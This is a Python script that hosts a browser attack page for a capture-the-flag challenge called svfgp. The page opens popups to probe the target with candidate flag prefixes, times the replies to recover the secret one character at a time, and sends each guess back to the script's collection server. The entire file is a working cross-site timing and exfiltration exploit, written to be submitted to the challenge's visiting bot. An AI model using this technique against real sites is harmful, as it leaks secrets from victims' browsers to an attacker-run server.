#!/usr/bin/env python3

import argparse
import json
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit

DEFAULT_TARGET = "https://svfgp.breakable.live/"
FLAG_RE = re.compile(r"CTF\{[0-9a-fA-F]{1,128}\}")
PREFIX_RE = re.compile(r"(CTF\{[0-9a-fA-F]{0,128}\}?)")

STATE = {
    "started": None,
    "events": [],
    "best_prefix": "CTF{",
    "last_flag": None,
}
LOCK = threading.Lock()


def build_attack_page(target: str, alphabet: str, start_prefix: str, max_len: int, retries: int) -> str:
    template = """<!doctype html>
<meta charset="utf-8">
<title>svfgp attack</title>
<body style="font-family:system-ui,sans-serif;padding:20px">
  running... current prefix: <code id="prefix"></code><br>
  check <code>/latest</code> for progress
</body>
<script>
const TARGET = __TARGET__;
const ALPHABET = __ALPHABET__;
const START = __START__;
const MAXLEN = __MAXLEN__;
const ROUND_TIMEOUT = 12000;
const ROUND_RETRIES = __RETRIES__;

function exfil(msg) {{
  const body = "m=" + encodeURIComponent(msg) + "&t=" + Date.now();
  try {{ navigator.sendBeacon("/collect", body); }} catch (e) {{}}
  try {{ fetch("/collect?" + body, {{ mode: "no-cors", credentials: "omit" }}); }} catch (e) {{}}
  try {{ (new Image()).src = "/collect?" + body; }} catch (e) {{}}
}}

function probeUrl(prefix, ch, sid, trial) {{
  return TARGET + "?mode=probe&q=" + encodeURIComponent(prefix + ch)
    + "&sid=" + encodeURIComponent(sid)
    + "&rid=" + encodeURIComponent(ch + "-" + trial);
}}

function oneRound(prefix, trial) {{
  return new Promise((resolve) => {{
    const sid = Math.random().toString(36).slice(2) + Date.now().toString(36) + "-" + trial;
    const starts = Object.create(null);
    const scores = Object.create(null);
    const wins = [];
    let done = false;

    function finish() {{
      if (done) return;
      done = true;
      removeEventListener("message", onMsg);
      for (const w of wins) {{
        try {{ if (w && !w.closed) w.close(); }} catch (e) {{}}
      }}
      const ranked = Object.entries(scores).sort((a, b) => b[1] - a[1]);
      resolve(ranked);
    }}

    function onMsg(ev) {{
      const data = ev.data || {{}};
      const rid = String(data.rid || "");
      const ch = rid.split("-")[0];
      if (data.type !== "svfgp-probe-done") return;
      if (data.sid !== sid) return;
      if (!(ch in starts)) return;
      if (ch in scores) return;
      scores[ch] = performance.now() - starts[ch];
      if (Object.keys(scores).length === ALPHABET.length) finish();
    }}

    addEventListener("message", onMsg);

    for (const ch of ALPHABET) {{
      starts[ch] = performance.now();
      try {{
        wins.push(open(probeUrl(prefix, ch, sid, trial), "_blank", "popup,width=120,height=120"));
      }} catch (e) {{
        scores[ch] = -1;
      }}
    }}

    setTimeout(finish, ROUND_TIMEOUT);
  }});
}}

function mergeRounds(rounds) {{
  const acc = Object.create(null);
  for (const ranked of rounds) {{
    for (const [ch, score] of ranked) {{
      (acc[ch] ||= []).push(Number(score));
    }}
  }}
  const merged = Object.entries(acc).map(([ch, arr]) => {{
    arr.sort((a, b) => a - b);
    const mid = arr[Math.floor(arr.length / 2)] || -1;
    const avg = arr.reduce((s, v) => s + v, 0) / (arr.length || 1);
    return [ch, mid, avg, arr.length];
  }});
  merged.sort((a, b) => b[1] - a[1]);
  return merged;
}}

async function rankRound(prefix) {{
  const rounds = [];
  for (let trial = 0; trial < ROUND_RETRIES; trial += 1) {{
    rounds.push(await oneRound(prefix, trial));
  }}
  return mergeRounds(rounds);
}}

(async () => {{
  let prefix = START;
  document.getElementById("prefix").textContent = prefix;
  exfil("start:" + prefix);

  while (!prefix.endsWith("}") && prefix.length < MAXLEN) {{
    const ranked = await rankRound(prefix);
    if (!ranked.length) {{
      exfil("fail:no-candidate:" + prefix);
      document.body.textContent = "failed at " + prefix;
      return;
    }}
    const best = ranked[0];
    const second = ranked[1] || ["?", -1];
    prefix += best[0];
    document.getElementById("prefix").textContent = prefix;
    exfil("guess:" + prefix + ":mid=" + Number(best[1]).toFixed(1) + ":next=" + Number(second[1]).toFixed(1));
  }}

  if (prefix.endsWith("}")) {{
    exfil("flag:" + prefix);
    document.body.textContent = prefix;
  }} else {{
    exfil("fail:maxlen:" + prefix);
    document.body.textContent = prefix;
  }}
}})().catch((e) => {{
  exfil("error:" + (e && e.stack ? e.stack : String(e)));
}});
</script>
"""
    template = template.replace("{{", "{").replace("}}", "}")
    return (
        template.replace("__TARGET__", json.dumps(target))
        .replace("__ALPHABET__", json.dumps(alphabet))
        .replace("__START__", json.dumps(start_prefix))
        .replace("__MAXLEN__", str(max_len))
        .replace("__RETRIES__", str(retries))
    )


def record_message(message: str) -> None:
    now = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    entry = {"time": now, "msg": message}
    with LOCK:
        STATE["events"].append(entry)
        STATE["events"] = STATE["events"][-300:]

        match = PREFIX_RE.search(message or "")
        if match:
            prefix = match.group(1)
            if len(prefix) > len(STATE["best_prefix"]):
                STATE["best_prefix"] = prefix

        flag = FLAG_RE.search(message or "")
        if flag:
            STATE["last_flag"] = flag.group(0)

    print(f"[collect] {now} {message}", flush=True)


class Handler(BaseHTTPRequestHandler):
    attack_html = ""

    def _write(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        parsed = urlsplit(self.path)
        if parsed.path in {"/", "/attack"}:
            if parsed.path == "/":
                body = (
                    "<h1>svfgp helper</h1>"
                    "<p>Attack page: <a href=\"/attack\">/attack</a></p>"
                    "<p>Status: <a href=\"/latest\">/latest</a></p>"
                ).encode()
                self._write(200, body, "text/html; charset=utf-8")
                return

            self._write(200, self.attack_html.encode(), "text/html; charset=utf-8")
            return

        if parsed.path == "/collect":
            values = parse_qs(parsed.query, keep_blank_values=True)
            record_message(values.get("m", ["<empty>"])[0])
            self._write(200, b"ok", "text/plain; charset=utf-8")
            return

        if parsed.path == "/latest":
            with LOCK:
                payload = json.dumps(
                    {
                        "started": STATE["started"],
                        "best_prefix": STATE["best_prefix"],
                        "last_flag": STATE["last_flag"],
                        "events": STATE["events"][-40:],
                    }
                ).encode()
            self._write(200, payload, "application/json")
            return

        if parsed.path == "/healthz":
            self._write(200, b"ok", "text/plain; charset=utf-8")
            return

        self._write(404, b"not found", "text/plain; charset=utf-8")

    def do_POST(self) -> None:
        parsed = urlsplit(self.path)
        if parsed.path != "/collect":
            self._write(404, b"not found", "text/plain; charset=utf-8")
            return

        length = int(self.headers.get("Content-Length", "0") or "0")
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        values = parse_qs(raw, keep_blank_values=True)
        record_message(values.get("m", [raw or "<empty>"])[0])
        self._write(200, b"ok", "text/plain; charset=utf-8")

    def log_message(self, fmt: str, *args) -> None:
        return


def main() -> int:
    parser = argparse.ArgumentParser(description="Host an svfgp timing-attack page and collect guesses")
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", type=int, default=8000)
    parser.add_argument("--public-base", help="Public base URL that serves this helper, used only for display")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--alphabet", default="0123456789abcdef}")
    parser.add_argument("--start-prefix", default="CTF{")
    parser.add_argument("--max-len", type=int, default=80)
    parser.add_argument("--retries", type=int, default=2)
    args = parser.parse_args()

    with LOCK:
        STATE["started"] = int(time.time())
        STATE["events"].clear()
        STATE["best_prefix"] = args.start_prefix
        STATE["last_flag"] = None

    Handler.attack_html = build_attack_page(
        target=args.target.rstrip("/") + "/",
        alphabet=args.alphabet,
        start_prefix=args.start_prefix,
        max_len=args.max_len,
        retries=args.retries,
    )

    server = ThreadingHTTPServer((args.listen_host, args.listen_port), Handler)

    display_host = "127.0.0.1" if args.listen_host == "0.0.0.0" else args.listen_host
    local_base = f"http://{display_host}:{args.listen_port}"
    public_base = (args.public_base or local_base).rstrip("/")
    attack_url = public_base + "/attack"

    print("[+] Attack URL:\n")
    print(attack_url)
    print()
    print("[+] Status URL:\n")
    print(public_base + "/latest")
    print()
    print("[+] Submit the attack URL to the svfgp bot and watch /latest for the recovered prefix.")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
